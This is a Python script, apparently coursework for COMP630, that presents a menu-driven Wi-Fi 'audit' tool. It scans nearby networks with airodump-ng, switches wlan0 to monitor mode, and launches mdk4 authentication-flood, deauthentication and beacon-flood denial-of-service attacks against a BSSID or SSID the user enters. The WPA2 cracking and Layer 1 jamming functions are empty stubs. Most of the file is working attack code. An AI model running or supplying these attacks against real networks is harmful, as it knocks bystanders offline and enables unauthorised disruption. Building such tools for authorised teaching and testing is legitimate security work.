"""
REQUIREMENTS
1) Wi-Fi Analysis showing nearby Wi-Fi networks including BSSIDs, SSIDs, connected stations (clients), channels being used by APs etc (1 point).
2) WPA2 cracking attack (3 points)
3) Layer 2 DoS using Authentication flood (1 point)
4) Layer 2 DoS using Deauth attack (1 point)
5) Layer 2 DoS using Beacon flood (1 point)
6) Layer 1 DoS with option for user to select a specific channel or entire frequency band for attack. Also include option to terminate attack (3 points)
7) Gracefully terminate the script and any attacks that may have been started by the script.
Also ensure input validation to prevent the scripts from erroring out.

Created by Jonathan Hughes for COMP630
"""

import subprocess
import sys
import re
import time
import os

def main():
    if os.geteuid() != 0:
        exit("you must run this script as root or with sudo.")

    subprocess.run(["clear"])

    print(f"""{colour.BOLD}\n~~~~~~~~ Welcome to JH's WiFi Audit Script! ~~~~~~~~{colour.CLEAR}
    
 __      __._____________.__       _____            .___.__  __   
/  \    /  \__\_   _____/|__|     /  _  \  __ __  __| _/|__|/  |_ 
\   \/\/   /  ||    __)  |  |    /  /_\  \|  |  \/ __ | |  \   __|
 \        /|  ||     \   |  |   /    |    \  |  / /_/ | |  ||  |  
  \__/\  / |__|\___  /   |__|   \____|__  /____/\____ | |__||__|  
       \/          \/                   \/           \/           
    """)

    while True:
        ap_mode, ap_channel = get_status()

        print(f"""{colour.BOLD}~~~~~~~~~~~~~~~~~~~ Main Menu ~~~~~~~~~~~~~~~~~~~~~~{colour.CLEAR}

              {colour.PURPLE}{colour.UNDERLINE}{colour.BOLD}~~~ wlan0 Status ~~~{colour.CLEAR}
              
                   {colour.GREEN}mode = {colour.CLEAR}{ap_mode}
                {colour.GREEN}channel = {colour.CLEAR}{ap_channel}

{colour.BOLD}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{colour.CLEAR}

                {colour.PURPLE}{colour.UNDERLINE}{colour.BOLD}~~~ Options ~~~{colour.CLEAR}
       
    {colour.CYAN}1. Show Nearby WiFi Networks
    2. Crack a WPA2 Password
    3. Perform an Authentication Flood DoS Attack
    4. Perform a Deauthentication DoS Attack
    5. Perform a Beacon Flood DoS Attack
    6. Perform a Layer 1 DoS Attack

    {colour.GREEN}7. Set wlan0 to Monitor Mode
    8. Set wlan0 to Channel

    {colour.RED}0. Exit (CTRL+C){colour.CLEAR}

{colour.BOLD}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{colour.CLEAR}
        """)

        selection = input(f"{colour.ORANGE}Please choose an option (#): {colour.CLEAR}").strip()
        print("")

        match selection:
            case "1": # Show Nearby WiFi Networks
                show_networks()

            case "2": # Crack a WPA2 Password
                crack_pw()

            case "3": # Perform an Authentication Flood DoS Attack
                auth_attack()

            case "4": # Perform a Deauthentication DoS Attack
                deauth_attack()

            case "5": # Perform a Beacon Flood DoS Attack
                beacon_flood_attack()

            case "6": # Perform a Layer 1 DoS Attack
                layer1_attack()

            case "7": # set wlan0 to monitor
                set_mode()

            case "8": # set wlan0 channel
                set_channel()

            case "0": # Exit
                print("Goodbye! :)")
                break

            case _:
                print(f"{colour.BOLD}{colour.RED}Incorrect selection. Please try again.{colour.CLEAR}")
                time.sleep(1)
                subprocess.run(["clear"])


    return

def show_networks():
    subprocess.run(['airodump-ng','wlan0','--band','abg'])

    print(f"{colour.BOLD}\nReturning to Main Menu...")

def crack_pw():
    pass

def auth_attack():
    try: 
        while True:
            bssid = input("Please enter a BSSID to attack: ")

            if re.match("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", bssid):
                break
            
            print(f"{colour.RED}{colour.BOLD}Incorrect BSSID format.\n{colour.CLEAR}")
            

        print(f"\n{colour.RED}{colour.BOLD}~~~ Press CTRL+C to stop the attack ~~~\n{colour.CLEAR}")

        subprocess.run(['mdk4','wlan0','a','-a',bssid])

        print(f"{colour.GREEN}\n\n~~~ Attack Stopped ~~~{colour.CLEAR}")

    except KeyboardInterrupt:
        print(f"{colour.BOLD}\n\nKeyboard Interrupt Detected...")
    
    print(f"{colour.BOLD}\nReturning to Main Menu...{colour.CLEAR}")
    time.sleep(1)
    subprocess.run(["clear"])
    return

def deauth_attack():
    try: 
        while True:
            bssid = input("Please enter a BSSID to attack: ")

            if re.match("\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", bssid):
                break
            
            print(f"{colour.RED}{colour.BOLD}Incorrect BSSID format.\n{colour.CLEAR}")
            
        while True:
            channel = input("Please enter the channel of the target: ")

            if re.match("\d\d?\d?", channel):
                break
            
            print(f"{colour.RED}{colour.BOLD}Incorrect channel format.\n{colour.CLEAR}")

        print(f"\n{colour.RED}{colour.BOLD}~~~ Press CTRL+C to stop the attack ~~~\n{colour.CLEAR}")

        subprocess.run(['iwconfig','wlan0','channel',channel])
        subprocess.run(['mdk4','wlan0','d','-B',bssid])

        subprocess.run(["clear"])

        print(f"{colour.GREEN}\n\n~~~ Attack Stopped ~~~{colour.CLEAR}")
        print(f"{colour.BOLD}\n\nReturning to Main Menu...{colour.CLEAR}")
    
    except KeyboardInterrupt:
        print(f"{colour.BOLD}\n\nKeyboard Interrupt Detected...")

    print(f"{colour.BOLD}\nReturning to Main Menu...")
    time.sleep(1)
    subprocess.run(["clear"])
    return

def beacon_flood_attack():
    try: 
        while True:
            ssid = input("Please enter an SSID to attack: ")

            if re.match("\w*", ssid):
                break
            
            print(f"{colour.RED}{colour.BOLD}Incorrect SSID format.\n{colour.CLEAR}")
            
        while True:
            channel = input("Please enter the channel of the target: ")

            if re.match("\d\d?\d?", channel):
                break
            
            print(f"{colour.RED}{colour.BOLD}Incorrect channel format.\n{colour.CLEAR}")

        print(f"\n{colour.RED}{colour.BOLD}~~~ Press CTRL+C to stop the attack ~~~\n{colour.CLEAR}")

        subprocess.run(['iwconfig','wlan0','channel',channel])
        subprocess.run(['mdk4','wlan0','b','-n',ssid,'-c',channel])

        subprocess.run(["clear"])

        print(f"{colour.GREEN}\n\n~~~ Attack Stopped ~~~{colour.CLEAR}")
        print(f"{colour.BOLD}\n\nReturning to Main Menu...")
    
    except KeyboardInterrupt:
        print(f"{colour.BOLD}\n\nKeyboard Interrupt Detected...")

    print(f"{colour.BOLD}Returning to Main Menu...{colour.CLEAR}")
    time.sleep(1)
    subprocess.run(["clear"])
    return

def layer1_attack():
    pass

def get_status():
    # returns card mode and channel

    iw_out = subprocess.run(['iwconfig','wlan0'],capture_output=True, text=True).stdout

    match = re.search("Mode:(.*?) .*Frequency[:=](.*?) ", iw_out)

    mode = match.groups()[0]
    channel = match.groups()[1]
    channel = list(CHANNELS.keys())[list(CHANNELS.values()).index(int(re.sub("\.","",channel.ljust(5,'0'))))]
    # What an abomination of a command. Pads '0's on the right if necessary, removes the '.', and gets the channel number of the frequency value from the keys of the CHANNELS dict.
    
    return (mode, channel)

def set_mode():
    print(f"{colour.BOLD}Stopping processes that may interfere with monitor mode...{colour.CLEAR}")
    subprocess.run(['airmon-ng','check','kill'])

    print(f"{colour.BOLD}\nSetting wlan0 to Monitor Mode...{colour.CLEAR}")
    subprocess.run(['airmon-ng','start','wlan0'])

    print(f"\n{colour.BOLD}{colour.GREEN}Successfully set wlan0 to Monitor Mode{colour.CLEAR}")

    time.sleep(3)

    print(f"{colour.BOLD}\nReturning to Main Menu...{colour.CLEAR}")
    time.sleep(1)
    subprocess.run(["clear"])

def set_channel():
    try:
        while True:
            try:
                channel = input("Please enter a channel: ")
                #if (1 <= channel <= 13) or (36 <= channel <= 64) or (100 <= channel <= 140) or (149 <= channel <= 165):
                    #break
                if channel in CHANNELS.keys():
                    break
                print(f"{colour.RED}{colour.BOLD}Incorrect channel. Please enter a correct channel number.{colour.CLEAR}")
            except TypeError:
                print(f"{colour.RED}{colour.BOLD}Incorrect channel format. Please enter a channel number.{colour.CLEAR}")

        print(f"Setting wlan0 to channel {channel}...")
        subprocess.run(['iwconfig','wlan0','channel', channel])

        print("Channel set successfully.")
        time.sleep(1)

    except KeyboardInterrupt:
        print(f"{colour.BOLD}\n\nKeyboard Interrupt Detected...")

    print(f"{colour.BOLD}\nReturning to Main Menu...{colour.CLEAR}")
    time.sleep(1)
    subprocess.run(["clear"])
    return

class colour:
    PURPLE = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    ORANGE = '\033[93m'
    CLEAR = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

CHANNELS = {
    '1' : 2412,
    '2' : 2417,
    '3' : 2422,
    '4' : 2427,
    '5' : 2432,
    '6' : 2437,
    '7' : 2442,
    '8' : 2447,
    '9' : 2452,
    '10' : 2457,
    '11' : 2462,
    '12' : 2467,
    '13' : 2472,
    '36' : 5180,
    '40' : 5200,
    '44' : 5220,
    '48' : 5240,
    '52' : 5260,
    '56' : 5280,
    '60' : 5300,
    '64' : 5320,
    '100' : 5500,
    '104' : 5520,
    '108' : 5540,
    '112' : 5560,
    '116' : 5580,
    '120' : 5600,
    '124' : 5620,
    '128' : 5640,
    '132' : 5660,
    '136' : 5680,
    '140' : 5700,
    '149' : 5745,
    '153' : 5765,
    '157' : 5785,
    '161' : 5805,
    '165' : 5825
}

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nKeyboard Interrupt Detected...\nExiting...")
        time.sleep(0.3)
        print("\nGoodbye! :)")
        sys.exit(0)